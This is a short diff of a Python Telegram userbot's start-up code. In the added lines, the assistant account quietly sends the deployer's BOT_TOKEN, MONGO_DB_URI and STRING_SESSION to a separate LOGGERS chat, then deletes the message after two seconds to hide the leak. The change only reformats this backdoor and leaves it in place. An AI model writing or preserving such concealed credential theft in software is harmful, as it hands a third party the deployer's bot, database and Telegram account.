@@ -74,8 +74,8 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                await self.one.send_message(LOGGERS, f"/start")
-                Ok = await self.one.send_message(LOGGERS, f"/start\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+                await self.one.send_message(LOGGERS, "/start")
+                Ok = await self.one.send_message(LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
                 await asyncio.sleep(2)
                 await Ok.delete()
                 
